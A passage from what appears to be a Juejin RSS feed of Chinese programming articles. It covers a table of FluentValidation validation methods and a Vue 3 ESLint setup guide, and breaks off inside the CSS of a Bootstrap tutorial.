<h4 data-id="heading-12">FluentValidation常用验证方法</h4>





























































































































<table><thead><tr><th>验证方法</th><th>说明</th></tr></thead><tbody><tr><td>NotNull()</td><td>验证值不能为 null</td></tr><tr><td>NotEmpty()</td><td>验证字符串、集合等不能为 null 或空（对字符串调用时等价于 !string.IsNullOrEmpty）</td></tr><tr><td>Empty()</td><td>验证值必须为 null 或空（字符串、集合等）</td></tr><tr><td>Equal(T expected) / Equal(Func&lt;T, TProperty&gt; expression)</td><td>验证值必须等于指定值或另一属性的值</td></tr><tr><td>NotEqual(T unexpected) / NotEqual(Func&lt;T, TProperty&gt; expression)</td><td>验证值不能等于指定值或另一属性的值</td></tr><tr><td>Length(int min, int max)</td><td>验证字符串长度必须在指定范围内（包含边界）</td></tr><tr><td>MinimumLength(int min)</td><td>验证字符串最小长度</td></tr><tr><td>MaximumLength(int max)</td><td>验证字符串最大长度</td></tr><tr><td>Matches(string regex) / Matches(Regex regex)</td><td>验证字符串是否匹配正则表达式</td></tr><tr><td>EmailAddress()</td><td>验证字符串是否为有效电子邮件格式</td></tr><tr><td>CreditCard()</td><td>验证字符串是否为有效的信用卡号（使用 Luhn 算法）</td></tr><tr><td>GreaterThan(T value) / GreaterThan(Expression&lt;Func&lt;T, TProperty&gt;&gt; expression)</td><td>验证值必须大于指定值或另一属性</td></tr><tr><td>GreaterThanOrEqualTo(T value) / GreaterThanOrEqualTo(Expression&lt;Func&lt;T, TProperty&gt;&gt; expression)</td><td>验证值必须大于或等于指定值或另一属性</td></tr><tr><td>LessThan(T value) / LessThan(Expression&lt;Func&lt;T, TProperty&gt;&gt; expression)</td><td>验证值必须小于指定值或另一属性</td></tr><tr><td>LessThanOrEqualTo(T value) / LessThanOrEqualTo(Expression&lt;Func&lt;T, TProperty&gt;&gt; expression)</td><td>验证值必须小于或等于指定值或另一属性</td></tr><tr><td>InclusiveBetween(T from, T to)</td><td>验证值必须在 [from, to] 范围内（包含边界）</td></tr><tr><td>ExclusiveBetween(T from, T to)</td><td>验证值必须在 (from, to) 范围内（不包含边界）</td></tr><tr><td>Must(Func&lt;TProperty, bool&gt; predicate)</td><td>自定义同步验证逻辑（返回 true 表示有效）</td></tr><tr><td>MustAsync(Func&lt;TProperty, CancellationToken, Task&gt; predicate)</td><td>自定义异步验证逻辑</td></tr><tr><td>Custom(Action&lt;TProperty, ValidationContext&gt; action)</td><td>完全自定义验证行为，可添加任意错误信息和属性名</td></tr><tr><td>CustomAsync(Func&lt;TProperty, ValidationContext, CancellationToken, Task&gt; action)</td><td>异步版本的 Custom</td></tr><tr><td>ScalePrecision(int scale, int precision)</td><td>验证 decimal 类型的小数位数（scale）和总位数（precision）</td></tr><tr><td>Cascade(CascadeMode mode)</td><td>设置当前规则的级联模式（Continue/Stop）</td></tr><tr><td>Predicate(Func&lt;T, bool&gt; predicate)</td><td>条件性跳过整个 RuleFor（较少用，通常用 When）</td></tr><tr><td>IsEnumName(bool caseSensitive = false)</td><td>验证字符串是否为枚举的有效名称</td></tr><tr><td>Enum()</td><td>验证值是否为有效枚举值（适用于可空或非可空枚举）</td></tr><tr><td>ChildRules(Action configure)</td><td>对复杂对象属性进行嵌套验证（需配合 SetValidator 或直接内联）</td></tr><tr><td>SetValidator(IValidator validator)</td><td>显式指定子属性的验证器实例</td></tr><tr><td>ForEach(Action&lt;IRuleBuilderInitial&lt;TElement, TElement&gt;&gt; ruleCallback)</td><td>对集合中的每个元素应用验证规则</td></tr></tbody></table>
<blockquote>
<p>注：</p>
<ul>
<li>所有方法均可链式调用，并支持 <code>.WithMessage()</code>、<code>.WithErrorCode()</code> 等自定义错误信息</li>
<li>部分方法（如 <code>NotEmpty</code>）对不同类型的属性（string、IEnumerable、Guid 等）有不同语义</li>
</ul>
</blockquote>
<hr/>
<p><strong>使用框架</strong></p>
<ul>
<li>FluentValidation 12.1.0</li>
<li>FluentValidation.DependencyInjectionExtensions 12.1.0</li>
</ul>
<p><strong>参考链接</strong></p>
<ul>
<li>官方文档：<code>https://docs.fluentvalidation.net</code></li>
<li>GitHub：<code>https://github.com/FluentValidation/FluentValidation</code></li>
<li>博客园-唐青枫：<code>[C#.NET FluentValidation 全面解析：优雅实现对象验证 - 我是唐青枫 - 博客园](https://www.cnblogs.com/TangQF/articles/19154031)</code></li>
</ul>
<blockquote>
<p><strong>版权声明</strong>：本文为个人原创，首发于微信公众号、掘金平台、博客园，作者均为「白气急」。转载请标明出处并附带链接。</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[VUE3项目配置]]></title>    <link>https://juejin.cn/post/7574869203447595008</link>    <guid>https://juejin.cn/post/7574869203447595008</guid>    <pubDate>2025-11-21T04:44:52.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7574869203447595008" data-draft-id="7574382925761445926" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="VUE3项目配置"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2025-11-21T04:44:52.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="用户9381691255360"/> <meta itemprop="url" content="https://juejin.cn/user/3485906645565271"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            VUE3项目配置
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3485906645565271/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    用户9381691255360
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-21T04:44:52.000Z" title="Fri Nov 21 2025 04:44:52 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-21
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    9
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读1分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">一、安装ESLint</h2>
<h3 data-id="heading-1">1、安装ESLint</h3>
<ol>
<li>下载并安装ESLint。</li>
</ol>
<blockquote>
<p><code>pnpm create @eslint/config@latest</code></p>
</blockquote>
<p>执行命令后，命令运行窗口会要求回答几个问题，回答完成后，就会在当前目录下生成eslint.config.ts配置文件，并且安装eslint相关的插件和依赖包。可以看到package.json文件发生了变化。</p>
<h3 data-id="heading-2">2、配置校验规则</h3>
<ol>
<li>打开eslint.config.ts配置文件。配置全局忽略文件。</li>
</ol>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> { defineConfig, globalIgnores } <span class="hljs-keyword">from</span> <span class="hljs-string">"eslint/config"</span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title function_">defineConfig</span>([
  <span class="hljs-comment">// 默认忽略node_modules</span>
  <span class="hljs-title function_">globalIgnores</span>([<span class="hljs-string">'dist/'</span>]),
  
  ...其他配置...
])
</code></pre>
<ol start="2">
<li>如果有个别需要校验的规则，可以放在rules模块中。</li>
</ol>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-function"><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title">defineConfig</span><span class="hljs-params">([
...其他配置...
    {
        rules: {
          <span class="hljs-string">"no-undef"</span>: <span class="hljs-string">"warn"</span>, <span class="hljs-comment">//未定义的变量</span>
          <span class="hljs-string">"no-var"</span>: <span class="hljs-string">"error"</span>, <span class="hljs-comment">//要求使用let或const, 而不是var</span>
        }
    }
    
])</span>
</span></code></pre>
<h3 data-id="heading-3">3、校验并修复</h3>
<ol>
<li>在package.json文件中，找到scripts模块，增加如下配置：</li>
</ol>
<pre><code class="hljs language-json" lang="json"><span class="hljs-attr">"scripts"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"lint"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"eslint src"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"fix"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"eslint src --fix"</span>
  <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
</code></pre>
<ol start="2">
<li>在某个src文件夹下的vue文件或者ts文件中，写一段错误代码，比如 <code>var a = 123</code>。</li>
<li>执行命令 <code>pnpm lint</code>，会对src文件夹下的所有文件按照eslint.config.ts配置文件中配置的校验规则进行校验，在控制台打印出校验不通过的信息。</li>
<li>执行命令 <code>pnpm fix</code>会对部分错误代码进行自动修正。</li>
</ol>
<blockquote>
<p>并不是所有错误都能被自动修正。可以访问官网查看哪些错误能够被自动修正。</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[使用Bootstrap框架搭建简单页面：快速构建现代化网站]]></title>    <link>https://juejin.cn/post/7574739133946462250</link>    <guid>https://juejin.cn/post/7574739133946462250</guid>    <pubDate>2025-11-21T04:57:03.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7574739133946462250" data-draft-id="7574734686494064676" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="使用Bootstrap框架搭建简单页面：快速构建现代化网站"/> <meta itemprop="keywords" content="前端,HTML"/> <meta itemprop="datePublished" content="2025-11-21T04:57:03.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="BBB努力学习程序设计"/> <meta itemprop="url" content="https://juejin.cn/user/3097787706900985"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            使用Bootstrap框架搭建简单页面：快速构建现代化网站
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3097787706900985/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    BBB努力学习程序设计
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-21T04:57:03.000Z" title="Fri Nov 21 2025 04:57:03 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-21
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    7
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.7;font-weight:400;font-size:16px;overflow-x:hidden;color:#212122}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-bottom:8px;padding-bottom:8px}.markdown-body h1{color:#a0a0a0;font-size:38px;margin-top:32px;padding-top:32px}.markdown-body h2{color:#fff;background-color:#212122;width:fit-content;border-bottom-right-radius:100px;margin-top:47px;margin-bottom:16px;padding:4px 48px 4px 8px;line-height:1.7;font-size:30px;transition:all .3s ease-out}.markdown-body h2:hover{border-bottom-right-radius:50px;transition:all .3s ease-out}.markdown-body h3{font-size:24px;padding-left:8px;margin-top:32px;border-bottom:2px solid #c6c4c4;line-height:1.7}.markdown-body h4{font-size:20px;padding-left:8px;margin-top:32px;border-bottom:1px solid #ddd}.markdown-body h5{font-size:16px;margin-top:24px}.markdown-body h6{margin-top:16px;line-height:1.1}.markdown-body p{font-size:16px;text-align:start;white-space:normal;text-size-adjust:auto;line-height:2;margin-top:16px;margin-bottom:16px}.markdown-body img{max-width:100%;margin:auto;padding-left:8px;padding-right:8px}.markdown-body hr{border:none;border-top:4px double #212122;margin-top:32px;margin-bottom:32px;text-align:center}.markdown-body hr:after{content:"♥";display:inline-block;position:relative;top:-15px;padding:0 10px;color:#212122;font-size:18px}.markdown-body code{word-break:break-word;overflow-x:auto;background-color:#f1f1f1;color:#ef7060;font-size:14px;padding:.065em 6px}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace;border-radius:2px}.markdown-body pre{overflow:auto;position:relative;line-height:1.7;box-shadow:0 0 8px hsla(0,0%,43.1%,.45);margin:32px 16px}.markdown-body pre:before{content:"";display:block;height:30px;width:100%;background:url(data:image/png;base64,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) 10px 10px no-repeat;background-color:#212122;box-shadow:0 0 8px hsla(0,0%,43.1%,.45);background-size:40px}.markdown-body pre&gt;code{font-size:14px;padding:16px 8px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#fff;background:#272822}.markdown-body pre&gt;code::-webkit-scrollbar{height:10px;background-color:#f5f5f5}.markdown-body pre&gt;code::-webkit-scrollbar-track{box-shadow:inset 0 0 6px rgba(0,0,0,.3);border-radius:3px;background-color:#f5f5f5}.markdown-body pre&gt;code::-webkit-scrollbar-thumb{border-radius:3px;box-shadow:inset 0 0 6px rgba(0,0,0,.3);background-color:#555}.markdown-body a{color:#ef7060;padding:2px;text-decoration:none;border-bottom:.125em solid #ef7060;border-radius:2px;box-shadow:inset 0 -.025em 0 #ef7060;transition:box-shadow .27s cubic-bezier(.77,0,.175,1),color .27s cubic-bezier(.77,0,.175,1)}.markdown-body a:focus,.markdown-body a:hover{outline:none;box-shadow:inset 0 -1.5em 0 #ef7060;color:#fff}.markdown-body a:before{content:"⇲ ";vertical-align:top;margin-left:2px;font-family:dart!important;font-size:12px;color:inherit;opacity:.7}.markdown-body table{background:#fbfbfb;border-radius:4px;border-collapse:collapse;margin:auto;padding:5px;width:95%;box-shadow:0 5px 10px rgba(0,0,0,.1);animation:float 5s infinite}.markdown-body table th{color:#fff;background:#212122;border-bottom:1px solid #9ea7af;border-right:1px solid #343a45;font-size:18px;padding:16px;text-align:left;vertical-align:middle}.markdown-body table th:first-child{border-top-left-radius:4px}.markdown-body table th:last-child{border-top-right-radius:4px;border-right:none}.markdown-body table tr{border-top:1px solid #c1c3d1;border-bottom:1px solid #c1c3d1;color:#666b85}.markdown-body table tr:hover td{background:#212122;color:#fff;border-top:1px solid #22262e}.markdown-body table tr:first-child{border-top:none}.markdown-body table tr:last-child{border-bottom:none}.markdown-body table tr:nth-child(odd) td{background:#f1f1f1}.markdown-body table tr:nth-child(odd):hover td{background:#212122}.markdown-body table tr:last-child td:first-child{border-bottom-left-radius:4px}.markdown-body table tr:last-child td:last-child{border-bottom-right-radius:4px}.markdown-body table td{background:#fbfbfb;padding:16px;text-align:left;vertical-align:middle;font-size:16px;border-right:1px solid #c1c3d1}.markdown-body table td:last-child{border-right:0}.markdown-body blockquote{color:#777;padding:1px 16px;margin:24px 0;border-left:4px solid #c6c4c4;background-color:#f1f1f1;transition:all .3s ease-out;border-radius:4px}.markdown-body blockquote:hover{border-left-color:#212122;background-color:#212122;color:#fff}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:24px}.markdown-body ol li,.markdown-body ul li{margin-bottom:6px;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body span.math{margin-left:32px;font-size:18px;font-weight:700}@media (max-width:720px){.markdown-body h1{font-size:30.4px}.markdown-body h2{font-size:24px}.markdown-body h3{font-size:19.2px}.markdown-body h4{font-size:16px}.markdown-body h5{font-size:12.8px}}</style><style data-highlight="" data-highlight-key="monokai">.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#272822;color:#ddd}.hljs-keyword,.hljs-literal,.hljs-name,.hljs-selector-tag,.hljs-strong,.hljs-tag{color:#f92672}.hljs-code{color:#66d9ef}.hljs-class 